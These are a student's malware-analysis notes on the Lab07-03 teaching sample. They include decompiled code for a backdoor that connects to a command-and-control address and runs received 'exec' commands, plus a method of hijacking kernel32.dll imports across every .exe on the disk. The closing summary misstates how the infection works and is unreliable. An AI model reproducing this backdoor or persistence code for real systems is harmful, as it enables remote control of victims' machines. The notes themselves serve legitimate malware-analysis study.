Lab07-03.exe
    PE Analysis
        # Virustotal
            34/72
            SHA-256: 3475ce2e4aaa555e5bbd0338641dd411c51615437a854c2cb24b4ca2c048791a

        # PEid
            Microsoft Visual C++ 6.0

        # PEview
            TimeStamp (IMAGE_FILE_HEADER): 2010/12/19 Sun 16:16:19 UTC
            Subsystem (IMAGE_OPTIONAL_HEADER): IMAGE_SUBSYSTEM_WINDOWS_CUI (cmd)
            Sections (Virtual Size / Size of Raw Data) -> No Packed
                .text: 970/1000
                .rdata: 2B2/1000
                .data: FC/1000
        
        # Dependency Walker
            KERNEL32.DLL
                CloseHandle
                CopyFileA
                CreateFileA
                CreateFileMappingA
                FindClose
                FindFirstFileA
                FindNextFileA
                IsBadReadPtr
                MapViewOfFile                   // May load file
                UnmapViewOfFile
            MSVCRT.DLL

        # strings.exe (Only part of the results)
            kerne132.dll                        // Fake kernel32.dll
            kernel32.dll
            .exe
            C:\*
            C:\windows\system32\kerne132.dll    // Install path
            Kernel32.
            Lab07-03.dll                        // Load externel dll
            C:\Windows\System32\Kernel32.dll
            WARNING_THIS_WILL_DESTROY_YOUR_MACHINE

    Dynamic Analysis
        C:\Documents and Settings\practice\Desktop>Lab07-03.exe WARNING_THIS_WILL_DESTROY_YOUR_MACHINE
        _
        C:\Documents and Settings\practice\Desktop>

        # RegShot (Part of results)
            NULL

        # procexp (View > Lower Pane View > DLLS / Handles)
            NULL

        # procmon
            Filter
                Process Name is Lab07-03.exe Include
                Operation is WriteFile Include
            Result
                8:58:13.4272932 PM	Lab07-03.exe	752	WriteFile	C:\WINDOWS\system32\kerne132.dll	SUCCESS	Offset: 0, Length: 65,536

        # ApateDNS
            NULL
            
        # INetSim
            NULL

        # autoruns
            NULL

        # sc
            NULL

        # IDA Pro
        
        main{
            v3 = CreateFileA(FileName, 0x80000000, 1u, 0, 3u, 0, 0);            // C:\\Windows\\System32\\Kernel32.dll
            hObject = v3;
            v4 = CreateFileMappingA(v3, 0, 2u, 0, 0, 0);
            v5 = MapViewOfFile(v4, 4u, 0, 0, 0);                                // Map C:\\Windows\\System32\\Kernel32.dll into memory
            v6 = v5;
            argca = (int)v5;
            v7 = CreateFileA(ExistingFileName, 0x10000000u, 1u, 0, 3u, 0, 0);   // Lab07-03.dll
            v50 = v7;
            if ( v7 == (HANDLE)-1 )
            exit(0);
            v8 = CreateFileMappingA(v7, 0, 4u, 0, 0, 0);
            if ( v8 == (HANDLE)-1 )
            exit(0);                                                            // Map Lab07-03.dll into Memory
            ...
            CloseHandle(hObject);
            CloseHandle(v50);
            if ( !CopyFileA(ExistingFileName, NewFileName, 0) )                 // C:\\windows\\system32\\kerne132.dll Lab07-03.dll
            exit(0);
            sub_4011E0(aC, 0);                                                  // aC = C:\\*
        }

                # sub_4011E0
                if ( !stricmp((const char *)&FindFileData.dwReserved0 + v6 + 3, aExe) )// .exe
                sub_4010A0(v7);

                    # sub_4010A0
                    if ( !stricmp((const char *)v10, Str2) )                    // kernel32.dll
                    {
                        qmemcpy(v10, &dword_403010, strlen((const char *)v10) + 1);             // kerne132.dll
                        v4 = v12;
                    }

                    .data:00403010 dword_403010    dd 6E72656Bh            ; DATA XREF: sub_4010A0+EC↑o
                    .data:00403010                                         ; _main+1A8↑r
                    .data:00403014 dword_403014    dd 32333165h            ; DATA XREF: _main+1B9↑r
                    .data:00403018 dword_403018    dd 6C6C642Eh            ; DATA XREF: _main+1C2↑r
                    .data:0040301C dword_40301C    dd 0                    ; DATA XREF: _main+1CB↑r

                        click A to convert those things to string
                        data:00403010 aKerne132Dll    db 'kerne132.dll',0     ; DATA XREF: sub_4010A0+EC↑o          // We can use PEview to check the differences between Lab07-03.dll and kerne132.dll.

Lab07-03.dll
    PE Analysis
        # Virustotal
            37/72
            SHA-256: f50e42c8dfaab649bde0398867e930b86c2a599e8db83b8260393082268f2dba

        # PEid
            Microsoft Visual C++ 6.0 DLL

        # PEview
            TimeStamp (IMAGE_FILE_HEADER): 2010/12/19 Sun 16:16:38 UTC
            Subsystem (IMAGE_OPTIONAL_HEADER): IMAGE_SUBSYSTEM_WINDOWS_GUI (Graphic)
            Sections (Virtual Size / Size of Raw Data) -> No Packed
                .text: 39E/1000
                .rdata: 23FC6/24000
                .data: 6C/1000
                .reloc: 204/1000
        
        # Dependency Walker
            KERNEL32.DLL
                CloseHandle
                CreateMutexA
                CreateProcessA
                OpenMutexA
                Sleep
            WS2_32.DLL
            MSVCRT.DLL

        # strings.exe (Only part of the results)
            !"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz{|}~
            TSAppCompat
            \Registry\Machine\System\CurrentControlSet\Control\Terminal Server
            SafeDllSearchMode
            \Registry\MACHINE\System\CurrentControlSet\Control\Session Manager
            \Registry\Machine\Software
            \NLS\NlsSectionUnicode
            \NLS\NlsSectionLocale
            ^v 
            \NLS\NlsSectionSortTbls
            \NLS\NlsSectionSortkey
            \Registry\Machine\System\CurrentControlSet\Control
            \Nls\Language Groups
            \Nls\Locale\Alternate Sorts
            \Nls\Locale
            \Device\NamedPipe\Win32Pipes.%08x.%08x
            \Registry\MACHINE\System\CurrentControlSet\Control\Session Manager\AppCompatibility
            \system32\Apphelp.dll
            \Registry\MACHINE\System\CurrentControlSet\Control\Session Manager\AppCertDlls
            \Registry\MACHINE\System\CurrentControlSet\Control\SafeBoot\Option
            \Registry\Machine\Software\Policies\Microsoft\Windows\Safer\CodeIdentifiers
            \Registry\Machine\System\CurrentControlSet\Control\ComputerName\ActiveComputerName
            \Registry\Machine\System\CurrentControlSet\Services\Tcpip\Parameters
            VWh(
            VWh
            Domain
            \Registry\Machine\Software\Policies\Microsoft\System\DNSclient
            exec
            sleep
            hello
            127.26.152.13
            SADFHUHF

    Dynamic Analysis
        no install* function

        # IDA Pro
            View > Open subviews > Function calls
                call    __alloca_probe
                call    ds:OpenMutexA           // SADFHUHF
                call    ds:CreateMutexA
                call    ds:WSAStartup
                call    ds:socket
                call    ds:inet_addr            // 127.26.152.13
                call    ds:htons
                call    ds:connect
                call    ds:send
                call    ds:shutdown
                call    ds:recv
                call    ebp ; strncmp
                call    ds:Sleep                // end of program
                call    ebp ; strncmp
                call    ebx ; CreateProcessA    // end of program
                call    ds:Sleep
                call    ds:CloseHandle
                call    ds:closesocket
                call    ds:WSACleanup

            DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved){
                ... 
                CreateMutexA(0, 0, Name);                                                   // SADFHUHF
                if ( !WSAStartup(0x202u, &WSAData) )
                {
                    v3 = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
                    if ( v3 != -1 )
                    {
                    name.sa_family = 2;
                    *(_DWORD *)&name.sa_data[2] = inet_addr(cp);                            // 127.26.152.13
                    *(_WORD *)name.sa_data = htons(80u);                                    // port 80
                    if ( connect(v3, &name, 16) != -1 )
                    {
                        while ( send(v3, ::buf, strlen(::buf), 0) != -1 && shutdown(v3, 1) != -1 )// hello
                        {
                        if ( recv(v3, &buf, 4096, 0) > 0 )                                  // recv command -> exec [commandline]
                        {
                            if ( !strncmp(Str1, &buf, 5u) )                                 // sleep
                            {
                            Sleep(0x60000u);
                            }
                            else if ( !strncmp(aExec, &buf, 4u) )                           // exec
                            {
                            memset(&StartupInfo, 0, sizeof(StartupInfo));
                            StartupInfo.cb = 68;
                            CreateProcessA(0, &CommandLine, 0, 0, 1, 0x8000000u, 0, 0, &StartupInfo, &ProcessInformation);      // ?CommandLine has no value which comes from recv, it should be modified before
                ...
            }

kerne132.dll
    PE Analysis
        # Virustotal
            10/67
            SHA-256: 4876e7eaa097afce123c09640a5778a7e07c3307b562a0ac5d0ea25298f19ed9

        # PEid
            Microsoft Visual C++ 6.0 DLL

        # PEview
            TimeStamp (IMAGE_FILE_HEADER): 2010/12/19 Sun 16:16:38 UTC              // Same as Lab07-03.dll
            Subsystem (IMAGE_OPTIONAL_HEADER): IMAGE_SUBSYSTEM_WINDOWS_GUI (Graphic)
            Sections (Virtual Size / Size of Raw Data) -> No Packed
                .text: 39E/1000
                .rdata: 23FC6/24000
                .data: 6C/1000
                .reloc: 204/1000
        
        # Dependency Walker
            KERNEL32.DLL
                CloseHandle
                CreateMutexA
                CreateProcessA
                OpenMutexA
                Sleep
            WS2_32.DLL
            MSVCRT.DLL

        # strings.exe (Only part of the results)
            exec
            sleep
            hello
            127.26.152.13
            SADFHUHF
            /0I0[0h0p0
            141G1[1l1
            1Y2a2g2r2
            3!3}3

    Dynamic Analysis
        no install* function
    
Analysis
    The malware firstly copy Lab07-03.dll under the directory C:\system32\ and rename it as kerne132.dll.
    Then it will traverse the C driver and find the actual kernel32.dll, it will map kernel32.dll and kerne132.dll into memory and copy all of the kerne132.dll into the kernel32.dll. (kerne132.dll do not have export functions so it will depend on the export arguments of kernel32.dll to let others load it.) It means any file will load kernel32.dll will actually call kerne132.dll. Then start communication with c&c server.
    The content in http://127.26.152.13/ is the command content like exec [execution_path].